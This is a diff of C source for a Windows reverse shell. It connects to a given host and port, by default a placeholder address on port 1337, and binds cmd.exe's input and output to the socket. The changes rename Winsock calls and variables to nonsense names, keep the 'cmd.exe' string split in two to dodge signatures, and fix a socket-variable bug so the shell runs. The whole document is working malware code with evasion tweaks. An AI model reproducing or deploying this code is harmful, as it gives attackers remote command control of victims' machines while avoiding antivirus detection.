@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
-// :)
+
 #define DEFAULT_BUFLEN 1024
 //Define struct of calls
 typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
@@ -13,8 +13,8 @@ typedef u_short(WSAAPI* HTONS)(u_short hostshort);
 typedef int (WSAAPI* CLOSESOCKET)(SOCKET s);
 typedef int (WSAAPI* WSACLEANUP)(void);
 
-void RunShell(char* who, int why) {
-    // Obtain the handle of the module the call address is present in (ONLY ONE I NEED)
+void flee(char* who, int why) {
+    // Obtain the handle of the module the call address is present in 
     HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
 
     // Pointer to API call address
@@ -25,31 +25,32 @@ void RunShell(char* who, int why) {
         HTONS kilogremz = (HTONS) GetProcAddress(hws2_32, "htons");
         CLOSESOCKET clozwoket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
         WSACLEANUP wakakleen = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup");
-        SOCKET mySocket;
+        SOCKET sokurt;
         struct sockaddr_in addr;
         WSADATA version;
         WakaStark(MAKEWORD(2,2), &version);
-        mySocket = WakaSokiwoki(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        sokurt = WakaSokiwoki(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
         addr.sin_family = AF_INET;
+
         addr.sin_addr.s_addr = whi_neti(who);
         addr.sin_port = kilogremz(why);
 
-        if (WakaKonekt(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
-            clozwoket(mySocket);
+        if (WakaKonekt(sokurt, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            clozwoket(sokurt);
             wakakleen();
         } else {
             printf("Connected to %s:%d\\n", who, why);
 
-            char P1[] = "cm";
-            char P2[] = "d.exe";
-            char* P = strcat(P1, P2);
+            char sessy1[] = "cm";
+            char sessy2[] = "d.exe";
+            char* Powah = strcat(sessy1, sessy2);
             STARTUPINFO sinfo;
             PROCESS_INFORMATION pinfo;
             memset(&sinfo, 0, sizeof(sinfo));
             sinfo.cb = sizeof(sinfo);
             sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s0;
-            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sokurt;
+            CreateProcess(NULL, Powah, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
             printf("Process Created %lu\\n", pinfo.dwProcessId);
 
@@ -58,15 +59,18 @@ void RunShell(char* who, int why) {
             CloseHandle(pinfo.hThread);
         }
 }
+
 int main(int argc, char **argv) {
     if (argc == 3) {
         int port  = atoi(argv[2]);
-        RunShell(argv[1], port);
+        flee(argv[1], port);
     }
     else {
         char cheese[] = "x.x.x.x";
-        int grater = 1337;
-        RunShell(cheese, grater);
+        int pie = 1337;
+        flee(cheese, pie);
     }
     return 0;
 } 
+
+
